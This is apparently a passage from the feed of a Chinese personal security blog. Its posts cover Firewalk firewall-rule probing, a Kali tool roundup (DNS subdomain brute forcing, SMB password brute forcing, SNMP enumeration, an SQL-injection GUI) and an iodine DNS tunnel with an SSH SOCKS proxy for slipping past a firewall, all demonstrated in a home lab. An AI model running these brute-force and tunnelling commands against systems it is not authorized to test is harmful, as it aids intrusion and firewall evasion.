    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o"><a href="#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o" class="headerlink" title="&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^"></a>&emsp;&emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^</h4><a id="more"></a>
<p><img src="http://packetfactory.openwall.net/projects/firewalk/firewalk.gif" alt="image"></p>
<h2 id="0x01-Firewalk-简介"><a href="#0x01-Firewalk-简介" class="headerlink" title="0x01. Firewalk 简介"></a>0x01. Firewalk 简介</h2><h4 id="emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。"><a href="#emsp-emsp-Firewalk-是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP-UDP-配置的策略规则，因此在内网中使用-Firewalk-将是我们最理想的选择。" class="headerlink" title="&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。"></a>&emsp;&emsp;Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。</h4><h2 id="0x02-Firewalk-原理"><a href="#0x02-Firewalk-原理" class="headerlink" title="0x02. Firewalk 原理"></a>0x02. Firewalk 原理</h2><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310171815_K8vVxh_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] Firewalk 主要是通过对 TTL 值的控制来达到探测目的的，下面介绍的原理理论上成立，但当我实际开防火墙测试时很多报文都会被防火墙过滤，但路由器测试毫无问题！</p>
</blockquote>
<h4 id="emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）"><a href="#emsp-emsp-1-Firewalk-首先通过-PC-发送一个-TTL值为-1-的探测包到下一级-Gateway-的-33434-端口，如果-Gateway-接收到TTL-值为-1-的TCP-报文之后它会把TTL-减一变为-0，然后给-PC-回复一个-ICMP-报文，这样就能完成第一步的网络探测（当我测试防火墙的时候-TCP-报文被防火墙丢弃，便无法进行后续探测步骤）" class="headerlink" title="&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）"></a>&emsp;&emsp;1. Firewalk 首先通过 PC 发送一个 TTL值为 1 的探测包到下一级 Gateway 的 33434 端口，如果 Gateway 接收到TTL 值为 1 的TCP 报文之后它会把TTL 减一变为 0，然后给 PC 回复一个 ICMP 报文，这样就能完成第一步的网络探测（当我测试防火墙的时候 TCP 报文被防火墙丢弃，便无法进行后续探测步骤）</h4><h4 id="emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放"><a href="#emsp-emsp-2-探测完成之后PC-会发送TTL-为-2-的-TCP-UDP-包给Gateway-的不同端口，如果该端口没有被防火墙毙掉那么就能被-Gateway-转发到下一个节点，也就是图中的-firewall-，firewall-接到TTL-为1-的报文回复一个-ICMP-数据包，我们就能判断出-Gateway-被测的端口开放" class="headerlink" title="&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放"></a>&emsp;&emsp;2. 探测完成之后PC 会发送TTL 为 2 的 TCP/UDP 包给Gateway 的不同端口，如果该端口没有被防火墙毙掉那么就能被 Gateway 转发到下一个节点，也就是图中的 firewall ，firewall 接到TTL 为1 的报文回复一个 ICMP 数据包，我们就能判断出 Gateway 被测的端口开放</h4><h4 id="emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则"><a href="#emsp-emsp-3-重复前两次操作测出内网中所有路由节点的策略规则" class="headerlink" title="&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则"></a>&emsp;&emsp;3. 重复前两次操作测出内网中所有路由节点的策略规则</h4><h2 id="0x03-Firewalk-实战"><a href="#0x03-Firewalk-实战" class="headerlink" title="0x03. Firewalk 实战"></a>0x03. Firewalk 实战</h2><h4 id="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"><a href="#我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。" class="headerlink" title="我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。"></a>我的防火墙会把探测包全部毙掉，在这里就不给大家演示了，就演示一下如何探测路由器的策略规则。</h4><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h4 id="emsp-emsp-1-kali-emsp-IP-192-168-1-107"><a href="#emsp-emsp-1-kali-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;1. kali &emsp;IP=192.168.1.107"></a>&emsp;&emsp;1. kali &emsp;IP=192.168.1.107</h4><h4 id="emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）"><a href="#emsp-emsp-2-gateway-emsp-IP-192-168-1-1-（vlan-开放53，80端口）" class="headerlink" title="&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）"></a>&emsp;&emsp;2. gateway &emsp;IP=192.168.1.1 （vlan 开放53，80端口）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310191938_xHQroD_Screenshot.jpeg" alt=""></p>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><blockquote>
<ol>
<li>首先配置路由器规则</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192546_EDr687_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</li>
</ol>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>图中的 100.64.0.1 其实是下一节点的 IP 地址，如果它也在内网中是一个路由节点的话那么我们的下一条命令应该是firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 100.64.0.1 8.8.8.8  通过最上面我给大家看的测试用图可知100.64.0.1 其实是公网IP</li>
</ol>
</blockquote>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"><a href="#emsp-emsp-其实-firewalk-真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。" class="headerlink" title="&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。"></a>&emsp;&emsp;其实 firewalk 真的是简单实用，渗透内网必备神器，但是有时理论往往会被现实摁在地上摩擦摩擦。既然不能保证工具是万金油，那么在最恰当的时候使用最正确的工具就能事半功倍。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot;&gt;&lt;a href=&quot;#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali使用入坑指南（二）</title>
    <link href="http://TimeS0ng.github.io/2018/03/08/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/</id>
    <published>2018-03-08T15:19:13.000Z</published>
    <updated>2018-04-15T14:45:21.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
<h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
<p>fierce 专用于爆破 DNS 域名，就像它的名字一样纯粹，平时msf 用的多了也喜欢用点简单小巧又功能实用的工具。在渗透测试时，偶尔会碰到某些域名的主站被做成了全静态页面，神仙也难渗透。此时从旁站渗透是必然的选择，这时候就需要用到 fierce 爆破二级域名对旁站下黑手了。再给大家推荐一篇<a href="http://cms.pengyueisos.com/wp/2017/12/一次web渗透测试的经历与分析（上）【鹏越·学霸专/" target="_blank" rel="external">渗透旁站的文章</a></p>
<p>爆破二级域名</p>
<p>fierce -dns kali.org -threads 10</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
<p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
<p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
<p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
<p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
<p>snmp-check 192.168.1.109 -c public -v 2c</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879" alt="image"></p>
<h2 id="0x04-路由策略探测工具–Firewalk"><a href="#0x04-路由策略探测工具–Firewalk" class="headerlink" title="0x04. 路由策略探测工具–Firewalk"></a>0x04. 路由策略探测工具–Firewalk</h2><blockquote>
<p>Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。如果想了解 firewalk 的原理请 <a href="https://times0ng.github.io/2018/03/10/Firewalk-原理/">点击这里</a></p>
<p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
<p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
<p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;a href=&quot;#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用iodine绕过防火墙</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/%E5%88%A9%E7%94%A8iodine%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/利用iodine绕过防火墙/</id>
    <published>2018-03-01T14:18:39.000Z</published>
    <updated>2018-03-01T14:23:18.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-iodine简介"><a href="#0x00-iodine简介" class="headerlink" title="0x00. iodine简介"></a>0x00. iodine简介</h2><h4 id="emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"><a href="#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！" class="headerlink" title="&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"></a>&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！</h4><a id="more"></a>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-ubuntu-emsp-IP-1-1-1-10"><a href="#emsp-emsp-ubuntu-emsp-IP-1-1-1-10" class="headerlink" title="&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10"></a>&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10</h4><h4 id="emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109"><a href="#emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109"></a>&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109</h4><h4 id="emsp-emsp-w2k3-emsp-IP-192-168-1-108"><a href="#emsp-emsp-w2k3-emsp-IP-192-168-1-108" class="headerlink" title="&emsp;&emsp;w2k3&emsp;IP=192.168.1.108"></a>&emsp;&emsp;w2k3&emsp;IP=192.168.1.108</h4><h4 id="emsp-emsp-kali-linux-emsp-IP-192-168-1-107"><a href="#emsp-emsp-kali-linux-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;kali linux&emsp;IP=192.168.1.107"></a>&emsp;&emsp;kali linux&emsp;IP=192.168.1.107</h4><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><blockquote>
<p>[*] 接下来我将按照下图配置实验环境，通过iodine绕过防火墙限制.</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301210737_kS5adL_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>首先配置firewall，限制ubuntu的上网能力，让它只能通过 UDP 53端口访问DNS 服务器w2k3</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301211815_oLwE6D_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>修改 ubuntu 的/etc/resolv.conf 文件，指定自己的 DNS 解析服务器为w2k3（192.168.1.108）</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301212345_NrgJ35_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>配置 DNS 服务器w2k3，并委派二级域名给 kali 主机</li>
</ol>
<p>[*] _1. 设置静态IP</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213258_iefU0H_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _2. 创建主域 times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213519_oaBMz2_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _3. 添加 kali 的主机记录</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213738_mUUxyM_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _4. 配置转发器，这样让w2k3可以解析公网域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214158_olvW8g_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _5. 委派二级域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214431_F4tb8U_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _6. 查看ubuntu上的域名解析记录，可以看到 ubuntu 已经能正确解析我们的 w2k3 和 kali 了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214910_bBF3h9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 kali 服务器端 iodined 和 ubuntu 的客户端 iodine</li>
</ol>
<p>iodined -f -c 2.2.2.2 www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215803_FRK2Ke_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>iodine -f www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215953_KMndUT_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>ubuntu 已经通过UDP 53 端口成功和 kali 建立隧道，可以利用之前设置的IP 2.2.2.2 进行网络通信了</li>
</ol>
<p>ssh -X root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220633_FX4p67_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>因为ubuntu 本身被防火墙限制不能上网，但我们可以将流量通过kali转发出去进行上网通信</li>
</ol>
<p>ssh -CNfg -D 8080 root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220853_0ex9Bc_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220923_sIRb8G_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"><a href="#emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。" class="headerlink" title="&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"></a>&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。</h4>]]></content>
    
    <summary type="html">
    
